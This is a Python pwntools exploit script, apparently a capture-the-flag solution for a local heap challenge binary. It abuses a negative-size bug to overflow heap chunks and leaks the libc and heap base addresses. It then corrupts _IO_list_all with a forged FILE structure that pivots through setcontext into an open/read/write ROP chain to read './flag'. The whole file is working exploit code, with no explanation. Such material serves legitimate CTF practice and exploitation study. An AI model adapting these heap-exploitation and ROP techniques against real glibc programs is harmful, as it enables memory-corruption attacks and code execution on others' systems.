from pwn import * 


context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'
sh = process('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Write(Until, Text):
    sh.sendlineafter(Until, Text)

def Add(idx, Size, Content):
    Write('Your choice:', '1')
    Write('Index:\n', str(idx))
    Write('Size:\n', str(Size))
    Write('Content:\n', Content)

def Edit(idx, Content):
    Write('Your choice:', '2')
    Write('Index:\n', str(idx))
    Write('Content:\n', Content)

def Dele(idx):
    Write('Your choice:', '3')
    Write('Index:\n', str(idx))

def Show(idx):
    Write('Your choice:', '4')
    Write('Index:\n', str(idx))

def Malloc(idx, Size, Content):
    Write('Your choice:', '666')
    Write('Index:\n', str(idx))
    Write('Size:\n', str(Size))
    sh.sendlineafter('Content:\n', Content)
    
def Change_Size(idx):
    Write('Your choice:', '1')
    Write('Index:\n', str(idx))
    Write('Size:\n', str(-1))

def Creat_File(rdi, addr, io_str_jump):
    _flags = 0
    _IO_write_base = 0
    _IO_write_ptr = (rdi -100) / 2 +1
    _IO_buf_end = (rdi -100) / 2 
    _freeres_list = 0x2
    _freeres_buf = 0x3
    _mode = -1
    vtable = io_str_jump - 0x8
    fake_file = p64(_flags)
    fake_file += p64(0x0) * 3 # read_ptr end base
    fake_file += p64(0x0)
    fake_file += p64(0x1) + p64(0x0)
    fake_file += p64(rdi) + p64(0x0)
    fake_file += p64(0x0) * 12
    fake_file += p64(0x0) + p64(0x0)
    fake_file += p64(0x0) + p64(0x0) # mode = -1
    fake_file += p64(0x0) * 2
    fake_file += p64(vtable)
    fake_file += p64(addr) * 2
    return fake_file



Add(0, 0x10, 'a')
Add(1, 0x300, 'b')
Add(2, 0x100, 'c')
Add(3, 0x20, 'd')
Change_Size(0)

Edit(0, 'a' * 0x10 + p64(0) + p64(0x421) + 'a' * 0x300 + p64(0) + p64(0x111) + 'a' * 0x100 + p64(0x420) + p64(0x31))
Dele(1)
Add(1, 0x300, 'b')
Show(2)
libcbase = u64(sh.recv(6).ljust(8, '\x00')) - libc.symbols['__malloc_hook'] - 0x70
log.success('libcbase: ' + hex(libcbase))
Add(2, 0x100, 'c')


IO_list_all = libc.symbols['_IO_list_all'] + libcbase
setcontext_addr = libc.symbols['setcontext'] + libcbase + 53

for i in range(5):
    Add(4, 0x120, 'e')
    Dele(4)

Add(5, 0x20, 'a')
Add(6, 0x300, 'a')
Add(7, 0x120, 'b')
Add(8, 0x20, 'b')
Add(9, 0x300, 'a')
Add(10, 0x120, 'b')
Add(11, 0x20, 'c')
Change_Size(5)
Change_Size(8)

Edit(5, 'a' * 0x20 + p64(0) + p64(0x441) + 'a' * 0x438 + p64(0x31))
Edit(8, 'a' * 0x20 + p64(0) + p64(0x441) + 'a' * 0x438 + p64(0x31))
Dele(6)
Add(12, 0x300, 'a')
Dele(9)
Edit(7, 'a' * 7)
Show(7)
sh.recvuntil('a' * 7 + '\n')
heapbase = u64(sh.recv(6).ljust(8, '\x00')) - 0x1150
log.success('heapbase: ' + hex(heapbase))
log.success('heap: ' + hex(heapbase + 0x15d0))
Add(12, 0x300, 'a')
Add(12, 0x300, 'a') # 15d0


open_addr = libc.symbols['open'] + libcbase
read_addr = libc.symbols['read'] + libcbase
write_addr = libc.symbols['write'] + libcbase
pop_rdx = libc.search(asm('pop rdx\nret', arch='amd64')).next() + libcbase
pop_rdi = libc.search(asm('pop rdi\nret', arch='amd64')).next() + libcbase
pop_rsi = libc.search(asm('pop rsi\nret', arch='amd64')).next() + libcbase
io_str_jump = 0x3e8360 + libcbase
rdi = heapbase + 0x16c0 - 0x20
rsp = rdi + 0x30 + 0x80
fake_file = Creat_File(rdi, setcontext_addr, io_str_jump)





payload = './flag\x00\x00'  # + 0x20 
payload += p64(0) * 8
payload += p64(rsp - 0x90) # 0x68 rdi 
payload += p64(0) * 2
payload += p64(0) * 2 # 78 80
payload += p64(0x30) # rdx 
payload += p64(0)
payload += p64(rsp)
payload += p64(open_addr) # rcx
payload += p64(pop_rdi) + p64(3) 
payload += p64(pop_rsi) + p64(rsp - 0x10)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(read_addr)
payload += p64(pop_rdi) + p64(1) 
payload += p64(pop_rsi) + p64(rsp - 0x10)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(write_addr)

fake_file += payload


Edit(12, fake_file)

Edit(10, p64(heapbase + 0xff0) + p64(IO_list_all - 0x18))
Add(13, 0x120, 'a')
Malloc(13, 0x120, 'a' * 0x8 + p64(heapbase + 0x15d0))
Edit(0, 'a' * 0x10 + p64(0) + p64(0x421) + 'a' * 0x300 + p64(0) + p64(0x111) + 'a' * 0x100 + p64(0x420) + p64(0x21))

gdb.attach(sh)


sh.interactive()